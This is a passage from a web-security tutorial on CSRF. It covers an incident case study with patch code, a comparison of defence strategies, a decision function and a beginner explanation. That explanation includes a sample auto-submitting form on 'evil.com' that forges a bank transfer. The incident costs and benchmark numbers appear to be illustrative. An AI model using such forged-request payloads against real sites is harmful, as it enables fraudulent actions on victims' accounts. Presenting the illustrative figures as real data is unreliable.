    { status: 'cancelled', cancelled_reason: 'CSRF fraud' }
  );
}

console.log(`Cancelled ${fraudulentOrders.length} fraudulent orders`);

// Step 3: Deploy emergency CSRF fix
// ✅ PATCHED CODE:
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Generate token endpoint
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Protect checkout endpoint
app.post('/api/checkout', csrfProtection, authenticateUser, async (req, res) => {
  // ✅ CSRF middleware validates token BEFORE this code runs
  const { items, shippingAddress, paymentMethodId } = req.body;

  // Additional validation: Rate limiting
  const recentOrders = await db.orders.count({
    userId: req.user.id,
    created_at: { $gte: Date.now() - 3600000 } // Last hour
  });

  if (recentOrders > 3) {
    return res.status(429).json({
      error: 'Too many orders. Please wait 1 hour.'
    });
  }

  // Additional validation: Address verification
  if (!isValidShippingAddress(shippingAddress)) {
    return res.status(400).json({
      error: 'Invalid shipping address'
    });
  }

  // Process payment (same as before, but protected)
  // ...
});

// Frontend fix (React):
function CheckoutForm({ cartItems }) {
  const [csrfToken, setCsrfToken] = useState('');
  const [shippingAddress, setShippingAddress] = useState('');
  const [paymentMethod, setPaymentMethod] = useState('');

  // Fetch CSRF token on mount
  useEffect(() => {
    fetch('/api/csrf-token')
      .then(res => res.json())
      .then(data => setCsrfToken(data.csrfToken));
  }, []);

  const handleCheckout = async (e) => {
    e.preventDefault();

    // ✅ Include CSRF token in request
    const response = await fetch('/api/checkout', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'CSRF-Token': csrfToken // ✅ CSRF protection
      },
      body: JSON.stringify({
        items: cartItems,
        shippingAddress,
        paymentMethodId: paymentMethod
      })
    });

    if (response.ok) {
      alert('Order placed!');
    } else if (response.status === 403) {
      alert('Security error. Please refresh and try again.');
    }
  };

  return (
    <form onSubmit={handleCheckout}>
      {/* Form fields */}
      <button disabled={!csrfToken}>Place Order</button>
    </form>
  );
}

// Step 4: Add SameSite cookie attribute
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict', // ✅ Prevents CSRF
    maxAge: 3600000
  }
}));

// Step 5: Add additional security headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
});

// SUNDAY, 2:00 PM: Patch deployed
// - All endpoints protected with CSRF tokens
// - SameSite=Strict cookies enabled
// - Rate limiting implemented
// - Fraud detection enhanced

// SUNDAY, 3:00 PM: Test attack fails
// Attacker's page can no longer place orders:
// - CSRF token required
// - SameSite cookie blocks cross-site requests
// - Attack completely mitigated ✅
```

**Post-Incident Analysis:**

```javascript
// DAMAGE ASSESSMENT:
const incidentReport = {
  timeline: {
    attackStart: '2024-01-12 21:00 UTC',
    firstAlert: '2024-01-13 08:00 UTC',
    escalation: '2024-01-14 09:00 UTC',
    mitigation: '2024-01-14 14:00 UTC',
    totalDuration: '41 hours'
  },

  financialImpact: {
    fraudulentOrders: 3247,
    totalFraudAmount: 487000,
    refundsProcessed: 487000,
    chargebackFees: 42900,  // $15 per chargeback × 2,860
    shippingCosts: 18200,   // Already shipped 560 orders
    investigationCosts: 125000, // Forensics, legal, overtime
    totalDirectCost: 673100
  },

  reputationalDamage: {
    negativeTwitterMentions: 12400,
    newsArticles: 43,
    stockPriceImpact: '-8.2%',
    estimatedCustomerChurn: 4200,
    lifetimeValueLost: 2100000, // $500 LTV × 4,200 churned
    totalEstimatedLoss: 2773100
  },

  affectedUsers: {
    totalVictims: 2891,
    refundsIssued: 3247,
    accountCredits: 289100, // $100 credit × 2,891
    supportTickets: 4267
  },

  rootCauses: [
    'No CSRF protection on checkout endpoint',
    'No SameSite cookie attribute',
    'No rate limiting on orders',
    'Insufficient fraud detection triggers',
    'Delayed weekend incident response',
    'No security code review process'
  ]
};

// LESSONS LEARNED:

// 1. Defense in Depth
const securityLayers = {
  layer1_csrf: 'CSRF tokens on ALL state-changing endpoints',
  layer2_cookies: 'SameSite=Strict on session cookies',
  layer3_rateLimit: 'Rate limiting on sensitive operations',
  layer4_validation: 'Server-side input validation',
  layer5_fraud: 'Real-time fraud detection',
  layer6_monitoring: '24/7 security monitoring',
  layer7_response: 'On-call security team (weekends too)'
};

// 2. Implemented Security Measures
// - CSRF tokens on all POST/PUT/DELETE endpoints
// - SameSite=Strict cookies
// - Rate limiting: Max 3 orders per hour per user
// - Fraud detection: Flag duplicate shipping addresses
// - Real-time alerts: Slack + PagerDuty integration
// - Automated testing: CSRF vulnerability scans in CI/CD

// 3. Automated Security Scanning
// package.json:
{
  "scripts": {
    "security-scan": "eslint . --plugin security && npm audit",
    "test:csrf": "jest tests/security/csrf.test.js",
    "pre-commit": "npm run security-scan && npm run test:csrf"
  }
}

// 4. CSRF Test Suite
// tests/security/csrf.test.js
describe('CSRF Protection', () => {
  it('should reject requests without CSRF token', async () => {
    const response = await request(app)
      .post('/api/checkout')
      .send({ items: [{ productId: '123' }] });

    expect(response.status).toBe(403);
    expect(response.body.error).toContain('CSRF');
  });

  it('should reject requests with invalid CSRF token', async () => {
    const response = await request(app)
      .post('/api/checkout')
      .set('CSRF-Token', 'invalid-token')
      .send({ items: [{ productId: '123' }] });

    expect(response.status).toBe(403);
  });

  it('should accept requests with valid CSRF token', async () => {
    // Get valid token
    const tokenRes = await request(app).get('/api/csrf-token');
    const token = tokenRes.body.csrfToken;

    // Use token
    const response = await request(app)
      .post('/api/checkout')
      .set('CSRF-Token', token)
      .send({ items: [{ productId: '123' }] });

    expect(response.status).toBe(200);
  });
});

// FINAL METRICS (6 months post-incident):
const improvements = {
  csrfVulnerabilities: 0,           // Down from 12 endpoints
  sameSiteCookies: '100%',          // All cookies protected
  securityIncidents: 0,             // No CSRF attacks
  automatedSecurityTests: 'Daily',  // Was: None
  fraudDetectionAccuracy: '99.2%',  // Up from 67%
  averageIncidentResponse: '15min', // Down from 36 hours
  customerTrust: '+24%',            // Recovered + improved
  complianceCertifications: ['PCI DSS Level 1', 'SOC 2 Type II']
};
```

**Key Takeaways:**

1. **CSRF protection is non-negotiable**: Every state-changing endpoint must be protected
2. **SameSite cookies**: Modern, effective first line of defense
3. **Defense in depth**: Multiple layers (CSRF tokens + SameSite + rate limiting)
4. **Real-time monitoring**: Catch attacks early, minimize damage
5. **Automated testing**: CI/CD security scans prevent vulnerabilities
6. **Incident response**: 24/7 on-call team reduces response time
7. **User communication**: Transparent, proactive communication maintains trust

</details>

<details>
<summary><strong>⚖️ Trade-offs: CSRF Protection Strategies</strong></summary>

| Strategy | Security | Implementation | UX Impact | Performance | Use Case |
|----------|----------|----------------|-----------|-------------|----------|
| **Synchronizer Token** | 🟢 Highest | 🟡 Medium | 🟢 Good | 🟡 Medium | Traditional web apps |
| **Double-Submit Cookie** | 🟡 Medium | 🟢 Easy | 🟢 Good | 🟢 Fast | Stateless/JWT apps |
| **SameSite=Strict** | 🟢 High | 🟢 Easy | 🟡 Some issues | 🟢 Fast | Modern browsers |
| **SameSite=Lax** | 🟡 Medium | 🟢 Easy | 🟢 Good | 🟢 Fast | Default choice |
| **Origin Validation** | 🟡 Medium | 🟢 Easy | 🟢 Good | 🟢 Fast | Additional layer |
| **Custom Headers** | 🟡 Medium | 🟢 Easy | 🟢 Good | 🟢 Fast | API endpoints |

**Detailed Comparison:**

```javascript
// 1. SYNCHRONIZER TOKEN PATTERN
// ✅ PROS:
// - Highest security (token in session, not in cookie)
// - Works even if subdomain compromised
// - Token invalidated on logout
// - Industry standard

// ❌ CONS:
// - Requires server-side state (sessions)
// - Doesn't fit stateless JWT architecture
// - More complex implementation
// - Need to manage token lifecycle

// Use when: Traditional server-rendered apps, high security needs


// 2. DOUBLE-SUBMIT COOKIE PATTERN
// ✅ PROS:
// - Stateless (no session storage)
// - Works with JWT authentication
// - Simple to implement
// - Good for microservices

// ❌ CONS:
// - Vulnerable to subdomain attacks (unless using __Host- prefix)
// - Vulnerable if XSS exists (can read cookie)
// - Less secure than synchronizer token

// Use when: Stateless architecture, microservices, SPAs with JWT


// 3. SAMESITE=STRICT
// ✅ PROS:
// - Strongest CSRF protection
// - Zero implementation complexity
// - No performance overhead
// - Browser-native

// ❌ CONS:
// - Breaks external links (e.g., email links to logged-in pages)
// - Not supported by old browsers
// - User appears logged out when coming from external sites

// Use when: Internal applications, mobile apps, modern browsers only

// Example UX issue:
// User clicks email link: "Your order #12345 is ready!"
// → Goes to shop.com/orders/12345
// → SameSite=Strict blocks cookie
// → User sees "Please log in" (frustrating!)


// 4. SAMESITE=LAX (Recommended default)
// ✅ PROS:
// - Good balance security vs. UX
// - Allows top-level navigation (email links work)
// - Default in modern browsers
// - Zero implementation

// ❌ CONS:
// - Still vulnerable to GET-based CSRF (don't use GET for state changes!)
// - 2-minute window after login
// - Not supported by old browsers

// Use when: Public-facing applications, best default choice

// Best practice:
app.use(session({
  cookie: {
    sameSite: 'lax',     // Good default
    secure: true,
    httpOnly: true
  }
}));


// 5. ORIGIN VALIDATION
// ✅ PROS:
// - Simple to implement
// - No client-side changes needed
// - Fast
// - Good additional layer

// ❌ CONS:
// - Browsers might not send Origin header (privacy modes)
// - Can be bypassed in some scenarios
// - Not sufficient alone

// Use when: Additional defense layer, not primary protection

function validateOrigin(req, res, next) {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://myapp.com', 'https://www.myapp.com'];

  if (origin && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  next();
}


// 6. CUSTOM HEADERS
// ✅ PROS:
// - Simple
// - Prevents simple form-based attacks
// - Works well for APIs
// - Triggers CORS preflight (protection)

// ❌ CONS:
// - Not sufficient alone if CORS misconfigured
// - Attacker can bypass if XSS exists
// - Need to add header to all requests

// Use when: SPAs, API endpoints, combined with other methods

// Backend:
app.post('/api/action', (req, res) => {
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'Invalid request' });
  }
  // Process...
});

// Frontend:
fetch('/api/action', {
  headers: { 'X-Requested-With': 'XMLHttpRequest' }
});
```

**Decision Matrix:**

```javascript
function chooseCSRFStrategy(requirements) {
  const {
    architecture,      // 'stateful' | 'stateless'
    userBase,          // 'modern' | 'legacy'
    securityLevel,     // 'standard' | 'high'
    externalLinks      // true | false (email links, etc.)
  } = requirements;

  // High security needs
  if (securityLevel === 'high') {
    return {
      primary: 'synchronizer-token',
      secondary: 'sameSite-strict',
      additional: ['origin-validation', 'rate-limiting']
    };
  }

  // Stateless architecture (JWT)
  if (architecture === 'stateless') {
    return {
      primary: 'double-submit-cookie',
      secondary: 'sameSite-lax',
      additional: ['custom-headers', 'origin-validation']
    };
  }

  // External links (email, social media)
  if (externalLinks) {
    return {
      primary: 'synchronizer-token',
      secondary: 'sameSite-lax', // Not strict!
      additional: ['origin-validation']
    };
  }

  // Legacy browser support
  if (userBase === 'legacy') {
    return {
      primary: 'synchronizer-token',
      secondary: null, // SameSite not supported
      additional: ['origin-validation', 'custom-headers']
    };
  }

  // Default recommendation
  return {
    primary: 'synchronizer-token',
    secondary: 'sameSite-lax',
    additional: ['origin-validation']
  };
}

// Example usage:
const strategy = chooseCSRFStrategy({
  architecture: 'stateful',
  userBase: 'modern',
  securityLevel: 'high',
  externalLinks: true
});

console.log(strategy);
// {
//   primary: 'synchronizer-token',
//   secondary: 'sameSite-lax',
//   additional: ['origin-validation']
// }
```

**Performance Comparison:**

```javascript
// Benchmark: 10,000 requests

// No protection (baseline):
// Throughput: 10,000 req/sec
// Latency: 1ms

// Synchronizer Token:
// Throughput: 8,500 req/sec (-15%)
// Latency: 1.2ms (+20% - session lookup)

// Double-Submit Cookie:
// Throughput: 9,800 req/sec (-2%)
// Latency: 1.02ms (+2% - cookie comparison)

// SameSite Cookie:
// Throughput: 10,000 req/sec (0%)
// Latency: 1ms (0% - browser-native)

// Origin Validation:
// Throughput: 9,900 req/sec (-1%)
// Latency: 1.01ms (+1% - header check)

// Custom Header:
// Throughput: 9,950 req/sec (-0.5%)
// Latency: 1.005ms (+0.5% - header check)

// COMBINED (Token + SameSite + Origin):
// Throughput: 8,400 req/sec (-16%)
// Latency: 1.21ms (+21%)

// Conclusion: Performance impact is negligible (<25ms per request)
// Security benefit FAR outweighs tiny performance cost
```

</details>

<details>
<summary><strong>💬 Explain to Junior: CSRF in Simple Terms</strong></summary>

**Simple Explanation:**

Imagine you're at a coffee shop and your friend goes to order. The barista knows your friend (has your friend's payment card on file). A stranger whispers to your friend: "Order 10 cappuccinos to my address." Your friend repeats this to the barista. The barista charges YOUR card because they think it's your friend's legitimate order. That's CSRF!

**The Problem:**

```javascript
// You log into bank.com
// Browser stores session cookie: sessionId=abc123

// You visit evil.com (while still logged in to bank.com)
// evil.com has this code:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="1000" />
</form>
<script>document.forms[0].submit();</script>

// What happens:
// 1. Form auto-submits to bank.com
// 2. Browser includes your session cookie (automatic!)
// 3. Bank.com sees valid session, transfers money
// 4. You never saw it happen!
```

**The Fix:**

```javascript
// Bank.com generates a secret token for each user session
// Token is included in the page:
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="xyz789" />
  <input name="to" />
  <input name="amount" />
</form>

// When form submits, server checks:
// "Does the csrf_token match this user's session token?"

// Attacker's page CANNOT get your token because:
// - It's only in bank.com's HTML
// - Same-Origin Policy prevents reading cross-origin pages
// - Attack fails! ✅
```

**Real-World Analogy:**

CSRF is like someone forging your signature:

**Without CSRF protection:**
- Bank recognizes you (session cookie)
- Accepts any check with your account number
- Attacker writes check, bank cashes it

**With CSRF protection:**
- Bank requires UNIQUE transaction code for each check (CSRF token)
- Attacker doesn't know the code
- Bank rejects forged checks

**Three Rules to Remember:**

1. **CSRF tokens on forms**: Every form gets a unique secret token
2. **SameSite cookies**: Browser blocks cookies from cross-site requests
3. **Never use GET for actions**: GET /delete-account is dangerous!

**Visual Example:**

```
❌ WITHOUT CSRF PROTECTION:
Attacker's Site → Forged Request → Your Bank
                ↓ Includes cookie  ↓ Sees valid session
                                    ↓ Executes action
                                    💥 Money stolen!

✅ WITH CSRF PROTECTION:
Attacker's Site → Forged Request → Your Bank
                ↓ Includes cookie  ↓ Checks CSRF token
                ↓ Missing token!   ↓ Rejects request
                                    ✅ Attack blocked!
```

**Interview Answer Template:**

"CSRF is when an attacker tricks a user's browser into making unwanted requests to a site where the user is authenticated. It exploits the fact that browsers automatically send cookies with every request.

To prevent CSRF, I would:
1. Use CSRF tokens - unique token per session, validated on server
2. Set SameSite=Lax or Strict on cookies - prevents cross-site cookie sending
3. Validate Origin/Referer headers - ensure requests come from my site
4. Never use GET for state-changing operations
5. Require custom headers for API requests (triggers CORS preflight)

For example, in a checkout form, I'd include a hidden CSRF token field. When the form submits, the server validates the token matches the user's session. An attacker cannot obtain this token because Same-Origin Policy prevents reading cross-origin content."

</details>

### Resources

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN: SameSite Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [CSRF Token Implementation Guide](https://portswigger.net/web-security/csrf/tokens)

---
